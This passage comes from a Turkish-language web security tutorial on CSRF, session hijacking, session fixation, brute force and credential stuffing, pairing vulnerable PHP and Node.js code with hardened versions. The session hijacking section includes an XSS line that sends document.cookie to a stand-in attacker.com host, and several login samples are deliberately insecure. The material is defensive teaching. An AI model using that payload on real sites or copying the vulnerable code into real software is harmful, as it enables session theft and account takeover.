        die("Güvenlik ihlali: Geçersiz veya eksik CSRF token.");
    }
    
    // Token doğrulaması başarılı ise işlem yürütülür
    $newEmail = $_POST['email'];
    $userId = $_SESSION['user_id'];
    
    $query = "UPDATE users SET email = ? WHERE id = ?";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("si", $newEmail, $userId);
    $stmt->execute();
    
    echo "E-posta adresiniz başarıyla güncellendi.";
}
?>
```
📄 HTML Form Tarafındaki Güvenli Yapılandırma
```html
<form action="update_email.php" method="POST">
  <input type="email" name="email" required>
  <!-- Gizli input olarak CSRF token forma enjekte ediliyor -->
  <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
  <input type="submit" value="Güncelle">
</form>
```
🧱 Savunma Katmanları (Defense-in-Depth)
Token mimarisinin yanı sıra, uygulamayı siteler arası isteklere karşı tamamen izole etmek amacıyla şu derinlemesine savunma katmanları entegre edilmelidir:

1. SameSite Çerez Bayrağının (SameSite Cookie Attribute) Kullanımı
Oturum çerezleri sunucu tarafında tanımlanırken SameSite özniteliği doğru modda yapılandırılmalıdır. Bu bayrak, tarayıcıya çerezin üçüncü parti sitelerden gelen isteklerde gönderilip gönderilmeyeceğini söyler.

🔒 SameSite=Strict: Çerez, yalnızca istek tarayıcının adres çubuğundaki domain ile birebir aynı kaynaktan geliyorsa HTTP isteğine eklenir. Harici bir siteden verilen linke tıklansa dahi çerez asla gönderilmez. CSRF saldırılarına karşı en güçlü tarayıcı seviyesindeki bariyeredir.

🔓 SameSite=Lax: Çerez, harici sitelerden gelen POST isteklerinde gönderilmez ancak kullanıcının dışarıdan bir linke tıklayarak siteye gelmesi gibi standart HTTP GET üst seviye (Top-level) yönlendirmelerinde gönderilir. Modern tarayıcılarda varsayılan moddur.

2. Özel HTTP Başlıkları (Custom Headers) ve API Mimarileri
Modern tek sayfa uygulamalarında (SPA - React, Angular, Vue) ve AJAX/Fetch tabanlı API mimarilerinde, isteklerin arkasına X-Requested-With veya X-CSRF-Token gibi özel HTTP başlıkları (Custom Headers) eklenir.

SOP Koruması: Tarayıcıların Aynı Köken Politikası (SOP - Same Origin Policy) gereği, harici bir domain (attacker.com), kullanıcının tarayıcısına hedef siteye doğru özel bir HTTP başlığı içeren istek yaptırma yetkisine sahip değildir. Sunucu tarafında gelen isteklerde bu özel başlıkların varlığı ve doğruluğu kontrol edilerek CSRF riskleri minimize edilir.

3. Kritik İşlemlerde Yeniden Doğrulama (Re-Authentication)
Şifre değiştirme, e-posta güncelleme veya finansal transferler gibi geri dönüşü olmayan yüksek riskli işlemler tetiklenmeden hemen önce ek güvenlik bariyerleri kurulmalıdır.

Ek Doğrulama: Kullanıcıdan mevcut şifresini (Current Password) tekrar girmesi istenmeli ya da iki faktörlü doğrulama (2FA/OTP) kodu talep edilmelidir.

Engelleme: Saldırgan, kurbanın tarayıcısına gizli bir istek yaptırabilse bile, kurbanın o anki şifresini veya telefonuna gelen tek kullanımlık kodu tahmin edemeyeceği için CSRF saldırısı yürütme (execution) aşamasında tamamen bloke edilmiş olur.


# 🛡️ 5. Session Hijacking (Oturum Çalma)

Siber saldırganın, sisteme meşru olarak giriş yapmış geçerli bir kullanıcıya ait aktif oturum belirtecini (Session ID, JWT veya çerezleri) yetkisiz yollarla ele geçirerek, kullanıcının parolasını veya kullanıcı adını bilmesine gerek kalmadan doğrudan onun kimliğiyle sisteme sızmasını sağlayan saldırı türüne **Session Hijacking** denir.

> 🌐 **Stateless Yapı ve Oturum Yönetimi:** Web uygulamalarında her HTTP isteği bağımsızdır (*stateless*). Uygulamalar kullanıcının durumunu korumak için giriş anında bir oturum anahtarı üretir ve bunu tarayıcıya çerez (*cookie*) veya yerel depolama (*local storage*) olarak kaydeder. 

Saldırgan bu benzersiz anahtarı ele geçirdiği an, sunucu katmanında doğrudan kurban ile eşleşir. Sunucu, gelen isteğin arkasındaki belirtecin meşruiyetini kontrol eder ancak istek sahibinin fiziksel olarak kurban mı yoksa saldırgan mı olduğunu ayırt edemez. Bu durum, hassas verilerin sızdırılmasına ve hesapların tamamen kaybedilmesine yol açar.

---

## 🔍 Session Hijacking Sömürü Yöntemleri ve Teknik Anatomisi

Oturum belirteçleri sızdırılırken saldırganlar genellikle üç ana siber saldırı vektörünü kullanırlar:

*   💉 **Siteler Arası Betik Çalıştırma (XSS):** Uygulamada bir XSS zafiyeti varsa, saldırgan enjekte ettiği JavaScript kodu vasıtasıyla tarayıcı hafızasında saklanan oturum verilerine (`document.cookie` veya `localStorage`) doğrudan erişir ve veriyi kendi sunucusuna sızdırır.
*   🕵️‍♂️ **Ortadaki Adam Saldırıları (MitM - Man-in-the-Middle):** Oturum belirteçlerini taşıyan HTTP istekleri ağ üzerinden şifrelenmeden (HTTP protokolü ile açık metin olarak) iletiliyorsa, aynı yerel ağdaki (örneğin güvensiz bir halka açık Wi-Fi ağındaki) saldırgan paket trafiğini koklayarak (*packet sniffing*) oturum anahtarını yakalar.
*   📌 **Oturum Sabitleme (Session Fixation):** Saldırgan, sunucudan önceden geçerli bir Session ID üretir (örneğin `PHPSESSID=xyz`). Bu ID değerini kurbana bir bağlantı vasıtasıyla kabul ettirir. Kurban bu sabitlenmiş ID ile sisteme giriş yaptığında, sunucu o ID'yi kurbanın hesabı ile ilişkilendirir. Saldırgan zaten elinde olan `xyz` anahtarını kullanarak kurbanın oturumuna dahil olur.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, başarılı bir kimlik doğrulamanın ardından oturum başlatan ancak çerez güvenliği parametrelerini (`HttpOnly`, `Secure`) ve oturum sabitleme kontrollerini (`session_regenerate_id`) tamamen göz ardı eden güvensiz bir yapı yer almaktadır:

```php
<?php
// GÜVENSİZ YAPI: Çerez politikaları ve parametreleri yapılandırılmadan oturum başlatılıyor.
// Varsayılan olarak çerezler JavaScript erişimine (XSS) açık durumdadır.
session_start();
 
$user = $_POST['username'];
$pass = $_POST['password'];
 
// Kullanıcı doğrulama simülasyonu
if (validate_user_credentials($user, $pass)) {
    
    // GÜVENSİZ YAPI: Giriş başarılı olduğunda eski session ID yenilenmiyor (Session Fixation riski!)
    $_SESSION['authenticated'] = true;
    $_SESSION['username'] = $user;
 
    echo "Giriş başarılı.";
}
?>
```
🎯 Saldırı Senaryosu (XSS + Cookie Sniffing)
Uygulamada çerezlerin güvensiz (HttpOnly kapalı) tanımlanması ve sayfada bir XSS açığı bulunması durumunda, saldırgan sayfaya şu zararlı JavaScript bloğunu enjekte eder:

// Saldırganın enjekte ettiği zararlı XSS betiği
// httponly aktif edilmediği için JavaScript, 'document.cookie' nesnesine doğrudan erişebilir!
new Image().src = "[http://attacker.com/log.php?cookie=](http://attacker.com/log.php?cookie=)" + encodeURIComponent(document.cookie);

⚙️ Saldırı Nasıl Gerçekleşir?
Kurban, zafiyet barındıran sayfayı ziyaret ettiğinde tarayıcı bu JavaScript kodunu otomatik olarak yürütür.

Betiğin çalışmasıyla birlikte kurbanın tarayıcısı, üzerinde PHPSESSID bilgisini taşıyan gizli bir HTTP isteğini saldırganın sunucusuna (attacker.com) gönderir.

Çerez yapılandırmasında herhangi bir kısıtlama olmadığı için tarayıcı bu isteği yürütür ve PHPSESSID değerini saldırgana teslim eder.

Saldırgan kendi tarayıcısının çerez alanına bu değeri yapıştırarak sayfayı yenilediği an, kurbanın şifresini bilmeye gerek duymadan hesaba doğrudan giriş yapar.

🔐 Doğru ve Güvenli Kod (Secure Code)
Session Hijacking saldırılarını önlemek için oturum başlatan fonksiyonların öznitelikleri sıkılaştırılmalı, oturum açıldığı an anahtar sıfırlanmalı ve istemci tarafında JavaScript erişimi tamamen izole edilmelidir.
```php
<?php
// GÜVENLİ YAPI: Oturum başlatılmadan önce çerez politikaları sunucu seviyesinde sıkılaştırılıyor
session_start([
    'cookie_lifetime' => 0,          // Tarayıcı kapatıldığında çerezin silinmesini sağlar
    'cookie_path'     => '/',        // Çerezin uygulamanın tüm rotalarında geçerli olmasını sağlar
    'cookie_domain'   => '',         // Sadece mevcut alt alan adıyla sınırlandırır
    'cookie_secure'   => true,       // MITM saldırılarını önlemek için SADECE HTTPS üzerinden iletilir
    'cookie_httponly' => true,       // XSS ile çerezin JavaScript üzerinden okunmasını engeller (Kritik!)
    'cookie_samesite' => 'Strict'     // CSRF ve harici kaynaklı oturum sızıntılarını önler
]);
 
$user = $_POST['username'];
$pass = $_POST['password'];
 
if (validate_user_credentials($user, $pass)) {
    // GÜVENLİ YAPI: Session Fixation (Oturum Sabitleme) saldırısını engellemek için
    // giriş yapıldığı an eski session ID iptal edilir ve kriptografik olarak yeni bir ID atanır
    session_regenerate_id(true);
 
    $_SESSION['authenticated'] = true;
    $_SESSION['username'] = $user;
 
    // [DERİNLİĞİNE SAVUNMA]: Kullanıcının oturum açtığı andaki tarayıcı bilgisini kaydeder
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
 
    echo "Giriş başarılı.";
}
?>
```
🧱 Savunma Katmanları (Defense-in-Depth)
Oturum yönetiminin siber saldırılara karşı direncini artırmak adına şu ek güvenlik katmanları uygulanmalıdır:

1. Kısa Oturum Ömürleri ve Hareketsizlik Zaman Aşımı (Session Timeout)
Ele geçirilen bir oturum anahtarının saldırgan tarafından kullanım süresini ve penceresini daraltmak amacıyla zaman aşımı politikaları uygulanmalıdır.

⏱️ Hareketsizlik Zaman Aşımı (Idle Timeout): Kullanıcı sistemde belirli bir süre (örneğin 15 dakika) hiçbir HTTP isteği üretmezse, sunucu tarafındaki oturum verileri otomatik olarak silinmeli ve çerez geçersiz kılınmalıdır.

🔄 Mutlak Zaman Aşımı (Absolute Timeout): Kullanıcı aktif olarak işlem yapmaya devam etse dahi, güvenlik gereği oturum belirli bir sürenin sonunda (örneğin 24 saat) tamamen sonlandırılmalı ve kullanıcının şifresiyle yeniden kimlik doğrulaması yapması istenmelidir.

2. Bağlam Kontrolleri ve Parmak İzi Doğrulaması (Session Fingerprinting)
Sunucu katmanında, gelen her HTTP isteğindeki kullanıcı bağlamı (Context), oturumun ilk açıldığı andaki verilerle karşılaştırılmalıdır.

💻 Tarayıcı Bilgisi Kontrolü: İstek sahibinin HTTP_USER_AGENT (tarayıcı ve işletim sistemi bilgisi) özniteliği kontrol edilmelidir. Giriş anındaki tarayıcı bilgisi ile işlem esnasındaki tarayıcı bilgisi uyuşmuyorsa, oturum bir hırsızlık şüphesiyle sunucu tarafından anında imha edilmelidir.

⚠️ Kritik Not: Saldırganlar User-Agent başlıklarını proxy araçlarıyla taklit edebilirler. Bu nedenle bu yöntem tek başına kesin bir çözüm değil, sömürü zorluğunu artıran ek bir doğrulama katmanıdır.

3. Güvenli Oturum Kapatma (Log-out) ve Sunucu Taraflı İmha Mekanizması
Kullanıcı uygulamadan çıkış yapmak istediğinde, süreç yalnızca istemci tarafındaki çerezi silerek (Client-side logout) yönetilmemelidir.

🧹 Sunucu Tarafından İmha: Çıkış butonuna basıldığında sunucuya bir istek gönderilmeli; sunucu, oturum saklama havuzundaki (Redis, Veri tabanı veya Dosya Sistemi) ilgili session kaydını ve token meşruiyetini tamamen yok etmelidir.

🚫 JWT Kara Listesi (Blacklist): Eğer JWT (JSON Web Token) gibi durum bilgisi barındırmayan (stateless) bir mimari kullanılıyorsa, çıkış yapan token bilgileri süresi dolana kadar sunucu tarafındaki bir kara listede (Blacklist/Deny-list) tutulmalı ve bu token'larla gelen istekler süreleri aktif olsa dahi reddedilmelidir.
# 🛡️ 6. Session Fixation (Oturum Sabitleme)

Uygulamanın kullanıcı giriş yapmadan önce atadığı oturum kimliğini (Session ID), kimlik doğrulama işlemi başarıyla tamamlandıktan sonra da değiştirmeden kullanmaya devam etmesi sonucu oluşan mantıksal yetkilendirme zafiyetine **Session Fixation** denir.

> 🔄 **Session Hijacking ile Farkı Nedir?**
> *   **Session Hijacking:** Saldırgan meşru bir kullanıcının halihazırda ürettiği aktif oturum anahtarını "çalmayı" hedefler.
> *   **Session Fixation:** Süreç tam tersi işler; saldırgan kendi belirlediği (sabitlediği) geçerli bir oturum kimliğini kurbana "hediye eder."

Uygulama mimarisi giriş anında bu kimliği yenilemediği için, kurban sisteme kendi kullanıcı adı ve şifresiyle giriş yaptığında sunucu, saldırganın zaten elinde olan bu sabit oturum kimliğini kurbanın hesabı ile ilişkilendirir. Sonuç olarak saldırgan, şifresini hiç bilmediği kurbanın hesabı üzerinde eş zamanlı ve tam yetkili bir erişim hakkı elde eder.

---

## 🔍 Session Fixation Sömürü Yöntemleri ve Teknik Anatomisi

Oturum sabitleme saldırıları, uygulamanın oturum belirteçlerini güvensiz taşıma yöntemlerine ve çerez kabul politikalarına göre üç temel aşamada gerçekleşir:

1.  🔑 **Oturum Kimliği Tedariği:** Saldırgan hedef web sitesini ziyaret ederek sunucudan meşru ve aktif bir oturum numarası (örneğin `PHPSESSID=999`) alır. Bu aşamada oturum henüz hiçbir hesaba bağlı değildir (misafir durumundadır).
2.  💉 **Oturum Kimliğinin Enjekte Edilmesi:** Saldırgan, elde ettiği bu numarayı kurbana kabul ettirmek için çeşitli yollar dener. Eğer uygulama oturum numaralarını URL parametresi üzerinden kabul ediyorsa, kurbana `http://example.com/?PHPSESSID=999` şeklinde bir bağlantı gönderir. Uygulama çerez tabanlıysa, kurbanın tarayıcısına XSS veya HTTP Header Injection vasıtasıyla bu çerez değerini yazar.
3.  👥 **Oturumun Ortak Kullanımı:** Kurban gönderilen bağlantıya tıklar ve tarayıcısında `999` anahtarı set edilmişken giriş panelinden kendi bilgileriyle login olur. Sunucu katmanı, oturum açma başarılı olduğu için `999` numaralı oturumu "yetkilendirilmiş" olarak işaretler. Saldırgan kendi tarayıcısından `999` değerini göndererek kurbanın hesabına doğrudan sızar.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, kullanıcının sisteme giriş talebini işleyen ancak yetki seviyesi değiştiği halde mevcut oturum belirtecini koruyan güvensiz bir doğrulama yapısı yer almaktadır:

```php
<?php
// GÜVENSİZ YAPI: Oturum başlatılıyor ancak giriş sonrasında ID yenilenmiyor!
session_start();
 
$user =$_POST['username'];
$pass =$_POST['password'];
 
// Kullanıcı doğrulama işlemi
if (validate_user_credentials($user,$pass)) {
    
    // GÜVENSİZ YAPI: Giriş başarılı olmasına rağmen session ID değeri sabit kalıyor.
    // Saldırganın önceden atadığı/bildiği Session ID ile kurbanın hesabı ilişkilendirilir.
    $_SESSION['authenticated'] = true;
    $_SESSION['user_id'] = get_user_id($user);
 
    echo "Giriş işlemi başarıyla tamamlandı.";
}
?>
```
🔐 Doğru ve Güvenli Kod (Secure Code)
Session Fixation saldırılarına karşı en kesin ve birincil savunma hattı, kullanıcının yetki seviyesi değiştiği anda (örneğin misafir modundan giriş yapmış kullanıcı moduna geçtiği veya standart kullanıcıdan admin rolüne yükseldiği tam o saniyede) eski oturum kimliğini tamamen imha etmek ve sıfırdan kriptografik olarak güvenli yeni bir Session ID üretmektir.
```php
<?php
// 1. ADIM: Oturum çerezi güvenlik parametrelerini sıkılaştırıyoruz
session_start([
    'cookie_lifetime' => 0,          // Tarayıcı kapatılınca silinsin
    'cookie_path'     => '/',
    'cookie_secure'   => true,       // Sadece HTTPS üzerinden iletilsin
    'cookie_httponly' => true,       // JavaScript erişimi engellensin (XSS koruması)
    'cookie_samesite' => 'Strict'     // CSRF koruması
]);
 
$user = $_POST['username'];
$pass = $_POST['password'];
 
// Kullanıcı doğrulama işlemi
if (validate_user_credentials($user, $pass)) {
    
    // 2. ADIM (KRİTİK): Giriş başarılı olduğu an Session ID değerini yeniliyoruz.
    // 'true' parametresi eski oturum dosyasını sunucudan tamamen siler.
    session_regenerate_id(true);
 
    $_SESSION['authenticated'] = true;
    $_SESSION['user_id'] = get_user_id($user);
 
    echo "Giriş işlemi başarıyla tamamlandı.";
}
?>
```
💡 Framework Notu: Modern web framework mimarileri (Spring Security, ASP.NET Core, Laravel vb.) mimari yapıları gereği kullanıcı başarılı bir şekilde kimlik doğrulamasından geçtiği an arka planda oturum kimliklerini otomatik olarak yeniler (Session Fixation Protection).

🧱 Savunma Katmanları (Defense-in-Depth)
Oturum yönetimini sabitleme saldırılarına karşı tamamen izole etmek adına uygulanması gereken derinlemesine savunma ilkeleri şunlardır:

1. Giriş Öncesi ve Sonrası Oturum Ayrımı (Strict Session Tracking)
Uygulama, kimlik doğrulama gerçekleşmeden önceki "misafir" oturumları ile giriş yapıldıktan sonraki "yetkili" oturumları mimari olarak birbirinden tamamen ayırmalıdır.

🚫 Kalıcı Nesne Oluşturmayın: Kullanıcı giriş yapmadıği sürece sunucu tarafında hiçbir şekilde kalıcı oturum nesnesi (Session State) oluşturulmamalıdır. Alışveriş sepeti gibi giriş öncesi takibi zorunlu veriler, geçici ve kimlik doğrulama ile ilişkisi olmayan anonim tanımlayıcılarla yönetilmelidir.

🔗 URL Parametrelerine Güvenmeyin: Uygulama, oturum belirteçlerini kesinlikle URL parametreleri (GET istekleri) üzerinden kabul etmemelidir. Oturum takibi yalnızca HTTP yanıt başlığında (Set-Cookie) tanımlanan ve gövdede taşınmayan çerezler vasıtasıyla gerçekleştirilmelidir.

2. SameSite ve Cookie Sınırlandırmaları
Saldırganların üçüncü parti siteler üzerinden veya siteler arası istek hatlarını kullanarak kurbanın tarayıcısına çerez enjekte etmesini engellemek amacıyla çerez güvenliği sıkılaştırılmalıdır.

🔒 SameSite=Strict: Oturum çerezleri tanımlanırken SameSite=Strict özniteliği zorunlu kılınmalıdır. Bu sayede tarayıcı, harici domainlerden gelen isteklerde veya yönlendirmelerde çerez manipülasyonuna izin vermez.

🛡️ Sıkı Bayraklar: Çerezlerin yalnızca şifreli kanallardan taşınmasını sağlayan Secure ve JavaScript erişimini engelleyen HttpOnly bayrakları eksiksiz şekilde set edilmelidir.

3. Çok Faktörlü Kimlik Doğrulama (MFA) Kurulumu
Mimaride Çok Faktörlü Kimlik Doğrulama (MFA) sisteminin aktif olması, Session Fixation saldırılarının sömürü aşamasını kritik bir bariyerle keser.

📱 İkinci Bariyer: Saldırgan oturum kimliğini sabitlemeyi başarsa ve kurban giriş yaptığında bu oturum yetkilendirilmiş duruma gelse bile, sistem giriş anında kurbandan zaman tabanlı tek kullanımlık bir kod (TOTP) talep edecektir.

🚫 Engelleme: Kullanıcı bu ikinci doğrulamayı kendi cihazından yapacağı için, saldırgan sadece sabitlenmiş oturum koduna sahip olmakla sistemi geçemez; kurbanın anlık ürettiği MFA doğrulama koduna takılarak sızma teşebbüsünde başarısız olur.

# 🛡️ 7. Brute Force (Kaba Kuvvet Saldırıları)

Siber saldırganın, korumalı bir sisteme giriş sağlayabilmek, şifrelenmiş bir veriyi çözebilmek veya gizli bir web dizinini keşfedebilmek amacıyla herhangi bir mantıksal ipucuna dayanmadan, deneme-yanılma (*trial-and-error*) yöntemiyle binlerce veya milyonlarca karakter, parola ya da kombinasyon dizisini ardışık olarak test etmesiyle gerçekleşen mekanik saldırı türüne **Brute Force** denir.

Kimlik doğrulama mekanizmalarına yönelik en eski ve en ilkel saldırı vektörlerinden biridir. Saldırganlar bu işlem için manuel denemeler yapmak yerine, saniyede binlerce istek üretebilen otomatize yazılımlar ve bot ağları (*botnet*) kullanırlar. Eğer hedef uç noktada (*endpoint*) istek sayısını kısıtlayan bir mekanizma ya da hesap kilitleme politikası bulunmuyorsa, saldırganın yeterli süre ve işlem gücüne (CPU/GPU) sahip olması durumunda şifreyi kırarak sisteme yetkisiz erişim sağlaması kaçınılmazdır.

---

## 🔍 Brute Force Varyasyonları ve Teknik Anatomisi

Kaba kuvvet saldırıları, kullanılan veri setine ve sömürü hedefine göre şu alt kategorilere ayrılır:

*   🧩 **Klasik Kaba Kuvvet (Simple Brute Force):** Herhangi bir sözlük kullanmadan, belirlenen karakter setindeki (örneğin a-z, A-Z, 0-9) tüm kombinasyonların sırayla denenmesidir (`aaa`, `aab`, `aac` vb.). Kısa şifreleri kırmak için etkilidir.
*   📖 **Sözlük Saldırıları (Dictionary Attacks):** En sık kullanılan parolaların, evrensel kelimelerin veya sızdırılmış şifre listelerinin (örneğin milyonlarca kayıt barındıran *RockYou* listesi) bir sözlük dosyası haline getirilerek sırayla test edilmesidir.
*   📨 **Kimlik Bilgisi Doldurma (Credential Stuffing):** Başka platformlardan sızdırılmış meşru kullanıcı adı ve şifre ikililerinin, otomatize scriptler vasıtasıyla hedef web uygulamasında toplu olarak denenmesidir. Kullanıcıların aynı şifreyi birden fazla sitede kullanma alışkanlığını suistimal eder.
*   🔄 **Tersine Kaba Kuvvet (Reverse Brute Force):** Belirli ve yaygın bir şifre (örneğin `Password123`) sabit tutularak, sistemdeki binlerce farklı kullanıcı adının sırayla denenmesi işlemidir. Bu yöntem, tek bir hesaba yüklenilmediği için hesap kilitleme politikalarını (*Account Lockout*) bypass etmek amacıyla tercih edilir.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki Node.js ve Express örneğinde, kullanıcı girişlerini doğrulayan ancak ardışık istekleri denetleyen hiçbir hız sınırlaması (*rate limiting*) veya bot engelleme mekanizması barındırmayan güvensiz bir API uç noktası yer almaktadır:

```javascript
const express = require('express');
const app = express();
app.use(express.json());
 
// Veri tabanı doğrulama simülasyonu
const db = require('./mockDatabase'); 
 
// GÜVENSİZ YAPI: Giriş uç noktası sonsuz denemeye açıktır
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    const user = await db.findUser(username);
    
    if (user && await db.verifyPassword(password, user.passwordHash)) {
        const token = db.generateToken(user.id);
        return res.status(200).json({ success: true, token });
    }
    
    // İstek başarısız olsa bile istemciye doğrudan hata dönülür ve yeni isteğe izin verilir
    return res.status(401).json({ success: false, message: "Hatalı kimlik bilgiileri." });
});
 
app.listen(3000);
```
🎯 Saldırı Senaryosu
Saldırgan, bir sözlük dosyasını (wordlist) alan ve /api/login adresine saniyede yüzlerce HTTP POST isteği fırlatan otomatize bir script hazırlar.

Sunucu, gelen her isteği hiçbir kısıtlamaya tabi tutmadan veri tabanına sorar ve CPU üzerinde ağır yük oluşturan şifre doğrulama fonksiyonunu (bcrypt.compare vb.) çalıştırır.

Saldırgan, sunucuda hesap kilitlenmesi veya IP engellenmesi yaşanmadığı için listedeki doğru şifreye ulaşana kadar saldırıyı kesintisiz sürdürür ve hesabı ele geçirir.

🔐 Doğru ve Güvenli Kod (Secure Code)
Brute Force saldırılarını önlemenin en kesin yöntemi, sunucu tarafında IP veya kullanıcı adı bazlı Hız Sınırlaması (Rate Limiting) uygulamaktır. Belirli bir zaman diliminde yapılabilecek maksimum istek sayısı sınırlandırılmalı, limit aşıldığında istekler durdurulmalıdır.
```php
const express = require('express');
const rateLimit = require('express-rate-limit');
const app = express();
app.use(express.json());
 
// GÜVENLİ YAPI: Giriş uç noktası için özel bir hız sınırlayıcı tanımlanıyor
const loginRateLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 dakikalık zaman penceresi
    max: 5,                  // Aynı IP adresinden 15 dakikada en fazla 5 istek kabul edilir
    message: {
        success: false,
        message: "Çok fazla giriş denemesi yapıldı. Lütfen 15 dakika sonra tekrar deneyin."
    },
    statusCode: 429,         // HTTP 429 Too Many Requests durum kodu dönülür
    standardHeaders: true,   // Yanıt başlığında limit bilgilerini döner (RateLimit-* headers)
    legacyHeaders: false,
});
 
const db = require('./mockDatabase');
 
// Tanımlanan limiter ara katmanı (middleware) login rotasına enjekte ediliyor
app.post('/api/login', loginRateLimiter, async (req, res) => {
    const { username, password } = req.body;
    
    const user = await db.findUser(username);
    
    if (user && await db.verifyPassword(password, user.passwordHash)) {
        const token = db.generateToken(user.id);
        return res.status(200).json({ success: true, token });
    }
    
    return res.status(401).json({ success: false, message: "Kullanıcı adı veya şifre hatalı." });
});
 
app.listen(3000);
```
🧱 Savunma Katmanları (Defense-in-Depth)
Kaba kuvvet saldırılarının otomatize doğasını bozmak ve sistem direncini artırmak adına şu ek güvenlik katmanları entegre edilmelidir:

1. Çok Faktörlü Kimlik Doğrulama (MFA) Entegrasyonu
Mimaride Çok Faktörlü Kimlik Doğrulama (MFA) sisteminin bulunması, Brute Force saldırılarının başarıya ulaşma ihtimalini neredeyse tamamen ortadan kaldırır.

İkinci Katman: Saldırgan kaba kuvvet yöntemiyle kullanıcın birinci aşamadaki parolasını doğru tahmin etse bile, bir sonraki aşamada kullanıcının fiziksel cihazında üretilen zaman tabanlı tek kullanımlık şifreye (TOTP) veya mobil onay mekanizmasına takılır. Bu ikinci faktör mekanik olarak tahmin edilemeyeceği için saldırı ilk aşamada bloke edilmiş olur.

2. Sıkı Şifre Politikaları ve Hesap Kilitleme (Account Lockout)
🔑 Karmaşıklık ve Uzunluk: Kullanıcıların tahmin edilmesi kolay şifreler seçmesi engellenmelidir. Şifrelerin asgari uzunluğu artırıldıkça, kaba kuvvet algoritmasının denemek zorunda olduğu matematiksel kombinasyon olasılığı (entropi) üssel olarak büyür ve saldırının tamamlanma süresi insan ömrünü aşacak boyutlara ulaşır.

🔒 Hesap Kilitleme Politikası: Ardışık hatalı denemelerin ardından hesap geçici olarak (örneğin 30 dakika) kilitlenmeli ya da her hatalı denemede sunucunun yanıt süresi yapay olarak uzatılarak (tuzak geciktirme - tarpitting) botların işlem hızı düşürülmelidir.

3. Ağ Seviyesinde Koruma: WAF ve Fail2ban Yapılandırması
Saldırı trafiği daha uygulama katmanına ulaşıp sunucu kaynaklarını (CPU/Bellek) tüketmeden önce ağ seviyesinde kesilmelidir.

🌐 Web Uygulama Güvenlik Duvarı (WAF): Cloudflare, AWS WAF gibi sistemler, gelen isteklerdeki anormallikleri, bot davranış modellerini ve bilinen saldırgan IP bloklarını analiz ederek kaba kuvvet isteklerini daha kapıda bloke eder. Giriş sayfalarına dinamik CAPTCHA zorunlulukları getirebilir.

🛡️ Fail2ban Entegrasyonu: Sunucu seviyesinde çalışan Fail2ban gibi servisler, uygulamanın veya web sunucusunun (Nginx, Apache) log dosyalarını gerçek zamanlı tarar. Belirli bir sürede çok fazla HTTP 401 veya 429 kodu üreten IP adreslerini tespit ettiği an, işletim sisteminin güvenlik duvarı (iptables/ufw) seviyesinde bu IP'leri tamamen banlayarak sunucuyla olan tüm network bağını keser.

# 🛡️ 8. Credential Stuffing

Siber saldırganların, daha önce başka web sitelerinden veya platformlardan sızdırılmış (veri ihlali/data breach sonucu internete yayılmış) kullanıcı adı, e-posta ve şifre kombinasyonlarını (**Combo List**) otomatize bot yazılımları kullanarak tamamen farklı hedef sitelerin giriş panellerinde toplu olarak test etmesiyle gerçekleşen kimlik avı saldırı türüne **Credential Stuffing** denir.

> 🔄 **Password Reuse Tehlikesi:** Bu saldırı vektörünün temel dayanağı, kullanıcıların birden fazla dijital platformda aynı e-posta adresini ve aynı şifreyi kullanma alışkanlığıdır.

Saldırganlar sıfırdan bir şifre tahmin etmek (*Brute Force*) yerine, halihazırda meşru olan veri kombinasyonlarını kullandıkları için başarı oranları oldukça yüksektir. Giriş istekleri yasal kullanıcı bilgileriyle yapıldığından, geleneksel imza tabanlı güvenlik sistemleri bu istekleri ilk etapta meşru birer oturum açma talebi olarak algılar. Saldırının başarılı olması; toplu hesap ele geçirmelerine (**Account Takeover - ATO**), finansal dolandırıcılıklara ve ciddi itibar kayıplarına yol açar.

---

## 🔍 Credential Stuffing Saldırılarının Teknik Anatomisi

Credential Stuffing, yapısı gereği yüksek hacimli ve otomatize bir süreçtir. Saldırganlar bu operasyonu şu teknik adımlarla yürütürler:

*   📂 **Combo List Tedariği:** Yeraltı forumlarından (Dark Web) milyonlarca satırdan oluşan `e-posta:şifre` veya `kullanıcı_adı:şifre` formatındaki listeler elde edilir.
*   🌐 **Proxy ve IP Rotasyonu:** Hız sınırlama (*Rate Limiting*) sistemlerine takılmamak ve tek bir IP adresinden gelen yoğun trafiği gizlemek amacıyla binlerce konut/mobil proxy (*Residential Proxies*) ağından yararlanılır. Her istek veya her birkaç denemede bir IP adresi değiştirilir.
*   🤖 **Bot Davranış Simülasyonu:** Saldırganların kullandığı araçlar (örneğin *OpenBullet*, *SilverBullet* veya özel Python scriptleri), hedef sitenin HTTP istek yapılarını taklit eder. Hatta tarayıcı parmak izlerini (*User-Agent*, Ekran Çözünürlüğü, Çerezler) dinamik olarak değiştirerek sisteme kendilerini gerçek bir insan gibi tanıtmaya çalışırlar.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, kullanıcı giriş isteklerini doğrulayan ancak gelen trafiğin bir bot ağına mı yoksa gerçek bir insana mı ait olduğunu ayırt edecek hiçbir davranışsal analiz, rate limiting veya sızdırılmış şifre kontrolü barındırmayan güvensiz bir giriş yapısı yer almaktadır:

```php
<?php
session_start();
 
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
$password = $_POST['password'];
 
if (!$email || empty($password)) {
    http_response_code(400);
    die(json_encode(["success" => false, "message" => "E-posta veya şifre eksik."]));
}
 
// GÜVENSİZ YAPI: Bot kontrolü, IP/Hesap bazlı rate limiting veya sızıntı denetimi yok!
// Otomatize araçlar bu uç noktaya saniyede binlerce Combo List isteği fırlatabilir.
$query = "SELECT id, password_hash FROM users WHERE email = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("s", $email);
$stmt->execute();
$result = $stmt->get_result();
 
if ($result->num_rows === 1) {
    $user = $result->fetch_assoc();
    if (password_verify($password, $user['password_hash'])) {
        session_regenerate_id(true);
        $_SESSION['user_id'] = $user['id'];
        
        echo json_encode(["success" => true, "message" => "Giriş başarılı."]);
        exit;
